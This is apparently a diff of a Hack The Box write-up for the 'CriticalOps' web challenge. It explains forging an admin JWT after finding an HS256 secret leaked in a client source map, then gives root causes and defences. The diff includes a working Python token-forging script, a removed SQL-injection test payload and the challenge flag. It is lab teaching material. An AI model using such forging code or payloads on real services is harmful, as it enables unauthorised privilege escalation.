@@ -1,14 +1,14 @@
 ---
 title: "CriticalOps"
-description: "Exploiting SQL Injection and abusing sudo privileges to escalate to root."
+description: "Forging an HS256 JWT to change the role and access administrative functionality."
 platform: "Hack The Box"
-category: "Linux"
+category: "Web"
 difficulty: "Medium"
-publishedAt: 2026-08-06
-tags: ["web", "sqli", "sql-injection", "linux", "sudo", "privesc"]
+publishedAt: 2026-08-08
+tags: ["web", "jwt", "hs256", "source-map", "authentication", "authorization"]
 language: "en"
 translationKey: "hack-the-box/critical-ops"
-draft: true
+draft: false
 featured: false
 ---
 
@@ -16,67 +16,100 @@ featured: false
 
 ## Overview
 
-[Brief description of the challenge, main objectives and techniques used]
+CriticalOps is an incident-management dashboard with an **Admin Panel**. The application stores a JWT on the client and uses the `role` claim to decide access. The objective is to turn a normal account into an admin by creating a valid replacement token.
 
-## Service Enumeration
+The flaw is that the JWT secret is present in the client bundle/source map. Because the token uses HS256, the leaked secret is enough to sign the token again after changing its payload.
 
-```bash
-# Port and service scanning
-nmap -sS -sC -sV [target-ip]
-```
+## JWT Analysis
 
-[Describe scan results and discovered services]
-
-## Web Application Analysis
-
-[Analyze web application functionality, endpoints, and input points]
-
-## SQL Injection Discovery
-
-[Steps to test and confirm SQL Injection vulnerability]
-
-```bash
-# Basic test payload
-' OR 1=1--
-```
-
-## SQL Injection Exploitation
-
-[Detailed process of exploiting SQLi to dump database and retrieve credentials]
-
-```bash
-# sqlmap or manual exploitation
-```
-
-## Initial Access
-
-[Steps to gain initial shell on the system]
-
-## Privilege Escalation
-
-[Analyze and exploit sudo misconfiguration or SUID binary]
-
-```bash
-# List sudo privileges
-sudo -l
-```
-
-## Flag
+A JWT has three dot-separated parts:
 
 ```text
-HTB{...}
+Header.Payload.Signature
 ```
+
+- `Header` contains the token type and signing algorithm, here `HS256`.
+- `Payload` contains claims such as `userId`, `username`, `role`, `iat`, and `exp`.
+- `Signature` lets the server verify whether the token was modified.
+
+The header and payload are Base64URL-encoded, not encrypted, so they can be read. However, changing the payload without generating a new signature makes the token invalid.
+
+## Solution
+
+### 1. Find the authentication token
+
+After logging in, open DevTools and inspect cookies or local storage. The application stores the token under the `authToken` key. Copy it for local analysis; do not send the real token to a third-party service.
+
+### 2. Read the source map for the secret
+
+In the **Sources** tab, search for `JWT_SECRET`. The source map points to `jwt.ts`, where the secret is hard-coded:
+
+```javascript
+const JWT_SECRET = 'SecretKey-CriticalOps-2025';
+```
+
+This is a serious design issue: a signing secret must remain on the server and must never be bundled into JavaScript sent to the client.
+
+### 3. Preserve claims and change the role
+
+Decode the current token, keep the identity and expiry claims, and change `role` to `admin`. The following script signs the token again with HMAC-SHA256:
+
+```python
+import base64
+import hashlib
+import hmac
+import json
+
+token = "PASTE_AUTH_TOKEN_HERE"
+secret = b"SecretKey-CriticalOps-2025"
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=")
+
+header_b64, payload_b64, _ = token.split(".")
+payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
+payload["role"] = "admin"
+
+new_payload_b64 = b64url(json.dumps(
+    payload, separators=(",", ":")
+).encode())
+signing_input = header_b64.encode() + b"." + new_payload_b64
+signature = b64url(hmac.new(
+    secret, signing_input, hashlib.sha256
+).digest())
+
+forged_token = signing_input.decode() + "." + signature.decode()
+print(forged_token)
+```
+
+Replace `authToken` with the new token and reload the dashboard. The server accepts `role=admin` because the replacement signature is valid, and the Admin Panel becomes available.
+
+### 4. Retrieve the flag
+
+The Admin Panel incident list contains a record whose title is the flag:
+
+```text
+HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_Im4g}
+```
+
+## Root Cause
+
+Two issues work together:
+
+1. The HS256 secret is shipped to the client through the bundle/source map.
+2. The server trusts the `role` claim in the token without an additional authorization check when the secret is compromised.
+
+JWTs do not encrypt their payload. Therefore, Base64URL encoding is not a security control and cannot hide roles or secrets.
 
 ## Defense
 
-- Use prepared statements/parameterized queries
-- Input validation and sanitization
-- Apply principle of least privilege for sudo
-- Regular security audits
-- WAF with SQL Injection protection rules
+- Sign and verify JWTs only on the server; never place `JWT_SECRET` in the client bundle, source map, or any frontend-exposed environment variable.
+- Use a long, random secret stored in a secret manager, and rotate it after any suspected exposure.
+- Allowlist the expected algorithm (`HS256` or the selected alternative) and reject unexpected `alg` values.
+- Do not use a client-controlled claim as the only authorization source. For sensitive actions, check the role through a server-side session or database.
+- Use short expirations, token revocation/rotation, and cookies protected with appropriate `HttpOnly`, `Secure`, and `SameSite` settings.
+- Disable production source maps or ensure they contain no secrets or other sensitive information.
 
 ## Lessons Learned
 
-- What worked effectively?
-- Which approaches failed?
-- How can this be defended against?
+When a JWT is present on the client, distinguish decoding a payload from producing a valid token. With HS256, a leaked secret makes every claim forgeable; inspecting the bundle and source map is often the decisive step.
